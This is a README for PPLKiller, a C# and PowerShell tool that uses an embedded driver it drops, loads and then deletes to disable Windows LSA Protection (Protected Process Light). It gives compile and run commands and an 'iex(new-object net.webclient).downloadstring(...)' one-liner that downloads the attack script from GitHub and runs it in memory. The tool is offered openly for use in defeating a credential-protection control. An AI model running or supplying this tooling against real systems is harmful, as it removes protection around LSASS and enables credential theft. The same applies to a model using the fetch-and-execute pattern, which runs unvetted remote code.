# PPLKiller
Tool to bypass LSA Protection (aka Protected Process Light). 

This is a c# re-write of [PPLKiller by RedCursorSecurityConsulting](https://github.com/RedCursorSecurityConsulting/PPLKiller)

I worked on this tool so that I could then create a powershell script out of it.

How the tool differs from the original:

- you won't need to place the driver on current location, as the script will do it itself (b64 embedded)

- no flags/parameters are needed when running the tool

The tool will take care of placing the driver on disk, loading it, disable PPL, unload the driver, and deleting the driver from disk.

## Compile

```
csc /platform:x64 /out:PPLKiller.exe PPLKiller.cs
```

## Run (exe)

```
PPLKiller.exe
```
![image](https://github.com/user-attachments/assets/36592f5e-58d3-4c10-8c49-d684d96e5e6e)

## Run (Invoke-PPLKiller)

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/PPLKiller/refs/heads/main/Invoke-PPLKiller.ps1')
```
```
Invoke-PPLKiller
```
![image](https://github.com/user-attachments/assets/6bf72346-bbc2-45e3-8313-0b82abe2c187)
